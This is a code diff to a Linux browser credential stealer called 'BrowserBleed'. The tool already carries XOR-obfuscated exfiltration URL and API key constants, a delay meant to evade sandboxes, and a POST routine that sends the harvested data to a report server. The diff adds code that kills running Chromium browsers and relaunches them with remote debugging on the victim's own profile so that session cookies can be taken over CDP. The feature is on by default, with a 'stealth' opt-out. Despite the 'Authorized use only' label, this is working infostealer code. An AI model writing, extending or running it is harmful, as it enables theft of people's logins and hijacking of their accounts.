@@ -78,6 +78,7 @@ def _xor_decrypt(cipher_hex: str, key_hex: str) -> str:
 _EXFIL_URL: str = _xor_decrypt(_EXFIL_URL_ENC, _EXFIL_XOR_KEY)
 _EXFIL_KEY: str = _xor_decrypt(_EXFIL_KEY_ENC, _EXFIL_XOR_KEY)
 _DEFAULT_DELAY: int = 0
+_enable_cdp: bool = True
 
 
 def _evasion_gate(delay_sec: int = 0) -> None:
@@ -856,6 +857,59 @@ def _cdp_find_port(process_name: str) -> int | None:
     return None
 
 
+def _cdp_port_alive(port: int) -> bool:
+    try:
+        conn = http.client.HTTPConnection("localhost", port, timeout=1)
+        conn.request("GET", "/json/version")
+        return conn.getresponse().status == 200
+    except Exception:
+        return False
+
+
+def _browser_exe_and_udir(process_name: str) -> tuple[str, str]:
+    for name in _CHROMIUM_ALT_NAMES.get(process_name, [process_name]):
+        for pid in find_pids(name):
+            try:
+                exe = os.readlink(f"/proc/{pid}/exe")
+            except OSError:
+                continue
+            cmdline = ""
+            try:
+                with open(f"/proc/{pid}/cmdline", "rb") as f:
+                    cmdline = f.read().replace(b"\x00", b" ").decode(errors="replace")
+            except OSError:
+                pass
+            m = re.search(r"--user-data-dir=(?:\"([^\"]+)\"|(\S+))", cmdline)
+            return exe, (m.group(1) or m.group(2)) if m else ""
+    return "", ""
+
+
+def relaunch_browser_with_cdp(process_name: str, port: int = 9222) -> bool:
+    exe, user_data_dir = _browser_exe_and_udir(process_name)
+    if not exe:
+        return False
+    for name in _CHROMIUM_ALT_NAMES.get(process_name, [process_name]):
+        for pid in find_pids(name):
+            try:
+                os.kill(pid, 9)
+            except OSError:
+                pass
+    time.sleep(1)
+    args = [exe, f"--remote-debugging-port={port}"]
+    if user_data_dir:
+        args.append(f"--user-data-dir={user_data_dir}")
+    try:
+        subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         start_new_session=True)
+    except Exception:
+        return False
+    for _ in range(30):
+        if _cdp_port_alive(port):
+            return True
+        time.sleep(1)
+    return False
+
+
 def _ws_connect(host: str, port: int, path: str) -> socket.socket:
     s   = socket.create_connection((host, port), timeout=8)
     s.settimeout(15)
@@ -1573,6 +1627,8 @@ def process_browser(name: str, process_name: str, user_data_path: str,
                 cdp_cookies: list[dict] = []
                 if running:
                     try:
+                        if _enable_cdp and _cdp_find_port(process_name) is None:
+                            relaunch_browser_with_cdp(process_name)
                         cdp_cookies = extract_cookies_cdp(process_name)
                     except Exception:
                         pass
@@ -1869,7 +1925,7 @@ def _exfil_results(url: str, api_key: str, txt_path: str, csv_path: str | None) 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 def main():
-    global _do_oidc
+    global _do_oidc, _enable_cdp
 
     parser = argparse.ArgumentParser(
         description="BrowserBleed - Browser Credential Extractor (Linux). Authorized use only."
@@ -1883,7 +1939,10 @@ def main():
     parser.add_argument("--exfil",       metavar="URL", default=_EXFIL_URL or None, help="POST results to report server")
     parser.add_argument("--exfil-key",   metavar="KEY", default=_EXFIL_KEY or None, help="API key for --exfil")
     parser.add_argument("--delay",       type=int, default=_DEFAULT_DELAY, help="Sleep N seconds before extraction (evade short-timeout sandboxes)")
+    parser.add_argument("--enable-cdp",   dest="enable_cdp", action="store_true", default=True, help="Relaunch a running Chromium browser with --remote-debugging-port to capture cookies via CDP — enabled by default")
+    parser.add_argument("--no-cdp",       dest="enable_cdp", action="store_false", help="Disable CDP cookie capture (stealth delivery)")
     args = parser.parse_args()
+    _enable_cdp = args.enable_cdp
     _evasion_gate(args.delay)
 
     if args.verify:
